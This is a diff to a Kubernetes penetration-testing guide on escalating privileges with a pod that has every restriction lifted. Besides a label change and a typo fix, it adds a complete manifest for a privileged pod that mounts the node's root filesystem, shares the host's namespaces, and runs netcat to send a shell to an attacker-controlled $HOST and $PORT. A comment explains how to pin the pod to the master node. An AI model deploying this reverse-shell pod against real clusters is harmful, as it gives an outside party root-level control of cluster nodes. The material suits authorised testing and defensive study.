@@ -10,7 +10,7 @@ kind: Pod
 metadata:
   name: pod-everything-allowed
   labels:
-    app: everything-allowed
+    app: pentest
 spec:
   hostNetwork: true
   hostPID: true
@@ -50,6 +50,34 @@ kubectl exec -it pod-everything-allowed -- chroot /host
 ```
 
 ## Or, create a reverse shell pod
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pod-everything-allowed-revshell
+  labels:
+    app: pentest
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  containers:
+  - name: everything-allowed-revshell
+    image: busybox
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: noderoot
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
+  # Force scheduling of your pod on master mode by uncommenting this line and changing the name
+  #nodeName: k8s-master
+  volumes:
+  - name: noderoot
+    hostPath:
+      path: /
+```
 [pod-everything-allowed-revshell.yaml](pod-everything-allowed-revshell.yaml)
 
 #### Set up listener
@@ -130,7 +158,7 @@ kubectl auth can-i --list --token=$DTOKEN #Shows cluster wide permissions
 
 # Demonstrate Impact
 
-If you are performing a penetration test, the end goal is not to gain cluster-admin, but rather to demonstrate the impact of exploitation. Use the access you have gained to accomplish the objectives of the pentration test. 
+If you are performing a penetration test, the end goal is not to gain cluster-admin, but rather to demonstrate the impact of exploitation. Use the access you have gained to accomplish the objectives of the penetration test. 
 
    
 # Reference(s)/Acknowledgements: 
